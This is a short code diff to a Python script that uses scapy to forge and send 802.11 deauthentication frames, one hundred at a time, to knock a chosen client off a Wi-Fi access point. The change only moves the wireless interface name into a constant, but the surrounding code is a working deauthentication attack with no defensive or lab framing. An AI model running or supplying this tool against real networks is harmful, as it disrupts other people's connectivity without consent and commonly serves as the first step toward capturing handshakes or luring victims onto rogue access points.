@@ -1,13 +1,14 @@
 
 from scapy.layers.dot11 import *
 
+INTERFACE = "wlan0"             # Interface to use
 
 # method to send deauthentication packets
 def perform_deauth(src, dest, ap, rc):
     dot11 = Dot11(addr1=dest, addr2=src, addr3=ap)
     packet = RadioTap() / dot11 / Dot11Deauth(reason=rc)
     # send packet
-    sendp(packet, inter=0.1, count=100, iface="wlp0s20f3mon", verbose=1)
+    sendp(packet, inter=0.1, count=100, iface=INTERFACE, verbose=1)
 
 
 if __name__ == '__main__':
